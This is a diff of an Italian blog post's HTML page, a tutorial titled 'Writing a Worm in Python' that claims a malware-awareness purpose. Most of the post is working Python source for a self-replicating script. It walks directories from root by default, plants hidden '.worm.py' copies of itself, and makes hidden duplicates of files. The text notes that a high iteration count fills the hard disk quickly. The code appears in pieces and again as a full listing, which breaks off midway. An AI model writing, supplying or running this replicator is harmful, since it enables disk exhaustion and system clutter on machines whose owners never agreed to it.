@@ -6,8 +6,8 @@
   
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Table Of Contents:
- Cos&amp;rsquo;è un Worm Scrivere un worm in Python  In questo post voglio iniziare una mini serie sulla Malware Analysis, al fine di comprendere qual&amp;rsquo;è il funzionamento di un virus, quali danni può comportare su un sistema e come scriverlo. La presa di consapevolezza di una certa minaccia, è la prima contromisura per potersi difendere da essa. Molti utente non sanno bene cos&amp;rsquo;è un Virus o qualsiasi altra sua variante, dunque questa serie prova a fare chiarezza sul tema mediante le ricerche che ho fatto in rete in merito." />
+<meta name="description" content=" In questo post voglio iniziare una mini serie sulla Malware Analysis, al fine di comprendere qual&amp;rsquo;è il funzionamento di un virus, quali danni può comportare su un sistema e come scriverlo. La presa di consapevolezza di una certa minaccia, è la prima contromisura per potersi difendere da essa. Molti utente non sanno bene cos&amp;rsquo;è un Virus o qualsiasi altra sua variante, dunque questa serie prova a fare chiarezza sul tema mediante le ricerche che ho fatto in rete in merito.
+" />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
 <link rel="canonical" href="https://kobra3390.github.io/SpaceHack/posts/scrivere-un-worm-in-python/scrivere_un_worm_in_python/" />
@@ -46,8 +46,8 @@
 <meta property="og:locale" content="en" />
 <meta property="og:type" content="article" />
 <meta property="og:title" content="Scrivere un Worm in Python">
-<meta property="og:description" content="Table Of Contents:
- Cos&amp;rsquo;è un Worm Scrivere un worm in Python  In questo post voglio iniziare una mini serie sulla Malware Analysis, al fine di comprendere qual&amp;rsquo;è il funzionamento di un virus, quali danni può comportare su un sistema e come scriverlo. La presa di consapevolezza di una certa minaccia, è la prima contromisura per potersi difendere da essa. Molti utente non sanno bene cos&amp;rsquo;è un Virus o qualsiasi altra sua variante, dunque questa serie prova a fare chiarezza sul tema mediante le ricerche che ho fatto in rete in merito." />
+<meta property="og:description" content=" In questo post voglio iniziare una mini serie sulla Malware Analysis, al fine di comprendere qual&amp;rsquo;è il funzionamento di un virus, quali danni può comportare su un sistema e come scriverlo. La presa di consapevolezza di una certa minaccia, è la prima contromisura per potersi difendere da essa. Molti utente non sanno bene cos&amp;rsquo;è un Virus o qualsiasi altra sua variante, dunque questa serie prova a fare chiarezza sul tema mediante le ricerche che ho fatto in rete in merito.
+" />
 <meta property="og:url" content="https://kobra3390.github.io/SpaceHack/posts/scrivere-un-worm-in-python/scrivere_un_worm_in_python/" />
 <meta property="og:site_name" content="HomePage" />
 
@@ -62,6 +62,8 @@
 
   <meta property="article:section" content="Malware Analysis" />
 
+
+  <meta property="article:published_time" content="0001-01-01 00:00:00 &#43;0000 UTC" />
 
 
 
@@ -142,7 +144,7 @@
       <span class="post-author">Autore: k0Br@3390</span>
     
     
-      <span class="post-reading-time">:: 8 min read (1535 words)</span>
+      <span class="post-reading-time">:: 8 min read (1524 words)</span>
     
   </div>
 
@@ -163,13 +165,22 @@
 
 
   
+    <div class="table-of-contents">
+      <h2>
+        Table of Contents
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#cosè-un-worm">Cos&rsquo;è un Worm</a></li>
+    <li><a href="#scrivere-un-worm-in-python">Scrivere un worm in Python</a></li>
+  </ul>
+</nav>
+    </div>
+  
 
   <div class="post-content"><div>
-        <p><strong>Table Of Contents</strong>:</p>
-<ul>
-<li><a href="#cos---un-worm">Cos&rsquo;è un Worm</a></li>
-<li><a href="#scrivere-un-worm-in-python">Scrivere un worm in Python</a></li>
-</ul>
+        <hr>
+<br>
 <p>In questo post voglio iniziare una mini serie sulla <code>Malware Analysis</code>, al fine di comprendere qual&rsquo;è il funzionamento di un virus, quali danni può comportare su un sistema e come scriverlo. La presa di consapevolezza di una certa minaccia, è la prima contromisura per potersi difendere da essa. Molti utente non sanno bene cos&rsquo;è un Virus o qualsiasi altra sua variante, dunque questa serie prova a fare chiarezza sul tema mediante le ricerche che ho fatto in rete in merito.</p>
 <h1 id="cosè-un-worm">Cos&rsquo;è un Worm<a href="#cosè-un-worm" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Un worm è un programma software dannoso che si replica sfruttando in modo indipendente le vulnerabilità nelle reti. A differenza di un virus, che richiede l&rsquo;esecuzione di un programma host, i worm possono essere eseguiti da soli. A parte l&rsquo;infezione iniziale dell&rsquo;host, non richiedono la partecipazione dell&rsquo;utente e possono diffondersi molto rapidamente sulla rete, di solito rallentandola.</p>
@@ -197,30 +208,30 @@ I worm sono responsabili di alcuni degli attacchi più devastanti su Internet. N
 <p>Un worm è diverso da un virus informatico in quanto i virus tipici infettano solo i file e i worm replicano i file e tengono i duplicati fuori dalla vista (come file nascosti).</p>
 <p>Avremo bisogno di due moduli per scrivere un worm. Qui, <em>os</em> è il modulo più importante e lo utilizzeremo per elencare tutti i file e le directory oltre a recuperare i percorsi assoluti.</p>
 <p><em>shutil</em> è usato per copiare il contenuto del file.  Ci sono ovviamente altri modi per farlo, tuttavia, ho scelto di farlo usando il metodo shutil.copyfile().</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
-<span style="color:#f92672">import</span> shutil
-</code></pre></div><p>Innanzitutto, creiamo una classe Worm e un metodo di inizializzazione per passare gli argomenti iniziali alla nostra classe creata.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Worm</span>:
-    
-    <span style="color:#66d9ef">def</span> __init__(self, path<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, target_dir_list<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, iteration<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
-        <span style="color:#66d9ef">if</span> isinstance(path, type(<span style="color:#66d9ef">None</span>)):
-            self<span style="color:#f92672">.</span>path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/&#34;</span>
-        <span style="color:#66d9ef">else</span>:
-            self<span style="color:#f92672">.</span>path <span style="color:#f92672">=</span> path
-            
-        <span style="color:#66d9ef">if</span> isinstance(target_dir_list, type(<span style="color:#66d9ef">None</span>)):
-            self<span style="color:#f92672">.</span>target_dir_list <span style="color:#f92672">=</span> []
-        <span style="color:#66d9ef">else</span>:
-            self<span style="color:#f92672">.</span>target_dir_list <span style="color:#f92672">=</span> target_dir_list
-            
-        <span style="color:#66d9ef">if</span> isinstance(target_dir_list, type(<span style="color:#66d9ef">None</span>)):
-            self<span style="color:#f92672">.</span>iteration <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
-        <span style="color:#66d9ef">else</span>:
-            self<span style="color:#f92672">.</span>iteration <span style="color:#f92672">=</span> iteration
-        
-        <span style="color:#75715e"># get own absolute path</span>
-        self<span style="color:#f92672">.</span>own_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>realpath(__file__)
-</code></pre></div><p>Qui abbiamo tre argomenti:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> shutil
+</span></span></code></pre></div><p>Innanzitutto, creiamo una classe Worm e un metodo di inizializzazione per passare gli argomenti iniziali alla nostra classe creata.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Worm</span>:
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, path<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, target_dir_list<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, iteration<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> isinstance(path, type(<span style="color:#66d9ef">None</span>)):
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>path <span style="color:#f92672">=</span> path
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> isinstance(target_dir_list, type(<span style="color:#66d9ef">None</span>)):
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>target_dir_list <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>target_dir_list <span style="color:#f92672">=</span> target_dir_list
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> isinstance(target_dir_list, type(<span style="color:#66d9ef">None</span>)):
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>iteration <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>iteration <span style="color:#f92672">=</span> iteration
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># get own absolute path</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>own_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>realpath(__file__)
+</span></span></code></pre></div><p>Qui abbiamo tre argomenti:</p>
 <ul>
 <li>path: definisce dove iniziare a cercare le directory (l&rsquo;impostazione predefinita è la directory principale /)</li>
 <li>target_dir_list: l&rsquo;utente può passare un elenco di directory di destinazione iniziali. Per impostazione predefinita è un elenco vuoto []</li>
@@ -228,137 +239,134 @@ I worm sono responsabili di alcuni degli attacchi più devastanti su Internet. N
 </ul>
 <p>Il primo metodo di cui abbiamo bisogno è elencare tutte le directory e le sottodirectory di destinazione in cui vogliamo copiare il nostro worm ei file esistenti nelle directory.</p>
 <p>Qui, sto evitando i file nascosti poiché include anche le directory principali (i file nascosti iniziano con il punto . in Linux o macOS).  A parte questo, aggiunge un file (le directory sono anche chiamate file nei file system basati su Unix) se si tratta di una directory e lo fa in modo ricorsivo per tutte le sottodirectory.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">list_directories</span>(self,path):
-        self<span style="color:#f92672">.</span>target_dir_list<span style="color:#f92672">.</span>append(path)
-        files_in_current_directory <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(path)
-        
-        <span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> files_in_current_directory:
-            <span style="color:#75715e"># avoid hidden files/directories (start with dot (.))</span>
-            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> file<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;.&#39;</span>):
-                <span style="color:#75715e"># get the full path</span>
-                absolute_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(path, file)
-                print(absolute_path)
-
-                <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isdir(absolute_path):
-                    self<span style="color:#f92672">.</span>list_directories(absolute_path)
-                <span style="color:#66d9ef">else</span>:
-                    <span style="color:#66d9ef">pass</span>
-</code></pre></div><p>Per replicare lo script stesso in tutte le directory di destinazione, otteniamo il percorso assoluto dello script che stiamo eseguendo, quindi copiamo il contenuto nelle directory di destinazione creando un nuovo file nascosto (inizia con un punto .) con lo stesso nome.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_new_worm</span>(self):
-        <span style="color:#66d9ef">for</span> directory <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>target_dir_list:
-            destination <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory, <span style="color:#e6db74">&#34;.worm.py&#34;</span>)
-            <span style="color:#75715e"># copy the script in the new directory with similar name</span>
-            shutil<span style="color:#f92672">.</span>copyfile(self<span style="color:#f92672">.</span>own_path, destination)
-</code></pre></div><p>Il seguente metodo verrà utilizzato per duplicare i file il numero di volte il valore che abbiamo dall&rsquo;argomento di iterazione. Puoi inserire un numero elevato in modo che il disco rigido si riempia presto.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">copy_existing_files</span>(self):
-        <span style="color:#66d9ef">for</span> directory <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>target_dir_list:
-            file_list_in_dir <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(directory)
-            <span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> file_list_in_dir:
-                abs_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory, file)
-                <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> abs_path<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;.&#39;</span>) <span style="color:#f92672">and</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isdir(abs_path):
-                    source <span style="color:#f92672">=</span> abs_path
-                    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(self<span style="color:#f92672">.</span>iteration):
-                        destination <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory,(<span style="color:#e6db74">&#34;.&#34;</span><span style="color:#f92672">+</span>file<span style="color:#f92672">+</span>str(i)))
-                        shutil<span style="color:#f92672">.</span>copyfile(source, destination)
-</code></pre></div><p>In questo metodo, chiameremo tutti i nostri metodi precedenti. Quindi, quando chiamiamo questo metodo utilizzando il nostro oggetto creato, il worm avvierà tutte le azioni in sequenza.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start_worm_actions</span>(self):
-        self<span style="color:#f92672">.</span>list_directories(self<span style="color:#f92672">.</span>path)
-        print(self<span style="color:#f92672">.</span>target_dir_list)
-        self<span style="color:#f92672">.</span>create_new_worm()
-        self<span style="color:#f92672">.</span>copy_existing_files()
-</code></pre></div><p>Ora, creiamo la nostra funzione principale ed eseguiamo il codice:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">if</span> __name__<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;__main__&#34;</span>:
-    current_directory <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>abspath(<span style="color:#e6db74">&#34;&#34;</span>)
-    worm <span style="color:#f92672">=</span> Worm(path<span style="color:#f92672">=</span>current_directory)
-    worm<span style="color:#f92672">.</span>start_worm_actions()
-</code></pre></div><p>Qui, per evitare di riempire il nostro disco, usiamo la directory esistente solo usando os.path.abspath(&quot;&quot;), e passiamolo come argomento durante la creazione di un oggetto della classe Worm. Finalmente chiamiamo il metodo di integrazione e siamo a posto.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">list_directories</span>(self,path):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>target_dir_list<span style="color:#f92672">.</span>append(path)
+</span></span><span style="display:flex;"><span>        files_in_current_directory <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(path)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> files_in_current_directory:
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># avoid hidden files/directories (start with dot (.))</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> file<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;.&#39;</span>):
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># get the full path</span>
+</span></span><span style="display:flex;"><span>                absolute_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(path, file)
+</span></span><span style="display:flex;"><span>                print(absolute_path)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isdir(absolute_path):
+</span></span><span style="display:flex;"><span>                    self<span style="color:#f92672">.</span>list_directories(absolute_path)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">pass</span>
+</span></span></code></pre></div><p>Per replicare lo script stesso in tutte le directory di destinazione, otteniamo il percorso assoluto dello script che stiamo eseguendo, quindi copiamo il contenuto nelle directory di destinazione creando un nuovo file nascosto (inizia con un punto .) con lo stesso nome.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_new_worm</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> directory <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>target_dir_list:
+</span></span><span style="display:flex;"><span>            destination <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory, <span style="color:#e6db74">&#34;.worm.py&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># copy the script in the new directory with similar name</span>
+</span></span><span style="display:flex;"><span>            shutil<span style="color:#f92672">.</span>copyfile(self<span style="color:#f92672">.</span>own_path, destination)
+</span></span></code></pre></div><p>Il seguente metodo verrà utilizzato per duplicare i file il numero di volte il valore che abbiamo dall&rsquo;argomento di iterazione. Puoi inserire un numero elevato in modo che il disco rigido si riempia presto.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">copy_existing_files</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> directory <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>target_dir_list:
+</span></span><span style="display:flex;"><span>            file_list_in_dir <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(directory)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> file_list_in_dir:
+</span></span><span style="display:flex;"><span>                abs_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory, file)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> abs_path<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;.&#39;</span>) <span style="color:#f92672">and</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isdir(abs_path):
+</span></span><span style="display:flex;"><span>                    source <span style="color:#f92672">=</span> abs_path
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(self<span style="color:#f92672">.</span>iteration):
+</span></span><span style="display:flex;"><span>                        destination <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory,(<span style="color:#e6db74">&#34;.&#34;</span><span style="color:#f92672">+</span>file<span style="color:#f92672">+</span>str(i)))
+</span></span><span style="display:flex;"><span>                        shutil<span style="color:#f92672">.</span>copyfile(source, destination)
+</span></span></code></pre></div><p>In questo metodo, chiameremo tutti i nostri metodi precedenti. Quindi, quando chiamiamo questo metodo utilizzando il nostro oggetto creato, il worm avvierà tutte le azioni in sequenza.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start_worm_actions</span>(self):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>list_directories(self<span style="color:#f92672">.</span>path)
+</span></span><span style="display:flex;"><span>        print(self<span style="color:#f92672">.</span>target_dir_list)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>create_new_worm()
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>copy_existing_files()
+</span></span></code></pre></div><p>Ora, creiamo la nostra funzione principale ed eseguiamo il codice:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    current_directory <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>abspath(<span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>    worm <span style="color:#f92672">=</span> Worm(path<span style="color:#f92672">=</span>current_directory)
+</span></span><span style="display:flex;"><span>    worm<span style="color:#f92672">.</span>start_worm_actions()
+</span></span></code></pre></div><p>Qui, per evitare di riempire il nostro disco, usiamo la directory esistente solo usando os.path.abspath(&quot;&quot;), e passiamolo come argomento durante la creazione di un oggetto della classe Worm. Finalmente chiamiamo il metodo di integrazione e siamo a posto.</p>
 <p>Ecco il codice completo:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
-<span style="color:#f92672">import</span> shutil
-
-<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Worm</span>:
-    
-    <span style="color:#66d9ef">def</span> __init__(self, path<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, target_dir_list<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, iteration<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
-        <span style="color:#66d9ef">if</span> isinstance(path, type(<span style="color:#66d9ef">None</span>)):
-            self<span style="color:#f92672">.</span>path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/&#34;</span>
-        <span style="color:#66d9ef">else</span>:
-            self<span style="color:#f92672">.</span>path <span style="color:#f92672">=</span> path
-            
-        <span style="color:#66d9ef">if</span> isinstance(target_dir_list, type(<span style="color:#66d9ef">None</span>)):
-            self<span style="color:#f92672">.</span>target_dir_list <span style="color:#f92672">=</span> []
-        <span style="color:#66d9ef">else</span>:
-            self<span style="color:#f92672">.</span>target_dir_list <span style="color:#f92672">=</span> target_dir_list
-            
-        <span style="color:#66d9ef">if</span> isinstance(target_dir_list, type(<span style="color:#66d9ef">None</span>)):
-            self<span style="color:#f92672">.</span>iteration <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
-        <span style="color:#66d9ef">else</span>:
-            self<span style="color:#f92672">.</span>iteration <span style="color:#f92672">=</span> iteration
-        
-        <span style="color:#75715e"># get own absolute path</span>
-        self<span style="color:#f92672">.</span>own_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>realpath(__file__)
-        
-        
-    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">list_directories</span>(self,path):
-        self<span style="color:#f92672">.</span>target_dir_list<span style="color:#f92672">.</span>append(path)
-        files_in_current_directory <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(path)
-        
-        <span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> files_in_current_directory:
-            <span style="color:#75715e"># avoid hidden files/directories (start with dot (.))</span>
-            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> file<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;.&#39;</span>):
-                <span style="color:#75715e"># get the full path</span>
-                absolute_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(path, file)
-                print(absolute_path)
-
-                <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isdir(absolute_path):
-                    self<span style="color:#f92672">.</span>list_directories(absolute_path)
-                <span style="color:#66d9ef">else</span>:
-                    <span style="color:#66d9ef">pass</span>
-    
-    
-    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_new_worm</span>(self):
-        <span style="color:#66d9ef">for</span> directory <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>target_dir_list:
-            destination <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory, <span style="color:#e6db74">&#34;.worm.py&#34;</span>)
-            <span style="color:#75715e"># copy the script in the new directory with similar name</span>
-            shutil<span style="color:#f92672">.</span>copyfile(self<span style="color:#f92672">.</span>own_path, destination)
-            
-    
-    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">copy_existing_files</span>(self):
-        <span style="color:#66d9ef">for</span> directory <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>target_dir_list:
-            file_list_in_dir <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(directory)
-            <span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> file_list_in_dir:
-                abs_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory, file)
-                <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> abs_path<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;.&#39;</span>) <span style="color:#f92672">and</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isdir(abs_path):
-                    source <span style="color:#f92672">=</span> abs_path
-                    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(self<span style="color:#f92672">.</span>iteration):
-                        destination <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory,(<span style="color:#e6db74">&#34;.&#34;</span><span style="color:#f92672">+</span>file<span style="color:#f92672">+</span>str(i)))
-                        shutil<span style="color:#f92672">.</span>copyfile(source, destination)
-                        
-                        
-    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start_worm_actions</span>(self):
-        self<span style="color:#f92672">.</span>list_directories(self<span style="color:#f92672">.</span>path)
-        print(self<span style="color:#f92672">.</span>target_dir_list)
-        self<span style="color:#f92672">.</span>create_new_worm()
-        self<span style="color:#f92672">.</span>copy_existing_files()
-        
-        
-                        
-<span style="color:#66d9ef">if</span> __name__<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;__main__&#34;</span>:
-    current_directory <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>abspath(<span style="color:#e6db74">&#34;&#34;</span>)
-    worm <span style="color:#f92672">=</span> Worm(path<span style="color:#f92672">=</span>current_directory)
-    worm<span style="color:#f92672">.</span>start_worm_actions()
-</code></pre></div><p>Vediamo un esempio pratico, abbiamo creato questa struttura di file di testo e sottocartelle di prova:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> shutil
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Worm</span>:
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, path<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, target_dir_list<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, iteration<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> isinstance(path, type(<span style="color:#66d9ef">None</span>)):
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
